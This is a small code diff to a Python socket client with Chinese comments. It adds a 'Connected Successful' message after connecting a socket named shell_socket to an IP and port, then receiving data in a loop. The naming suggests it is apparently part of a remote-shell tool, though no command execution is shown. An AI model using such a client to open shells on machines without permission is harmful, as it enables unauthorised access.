@@ -7,6 +7,7 @@ def main():
     shell_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     # connect连接
     shell_socket.connect((ip,port))
+    print("Connected Successful")
     # 接收数据
     while True:
         data = shell_socket.recv(1024).decode("gbk")
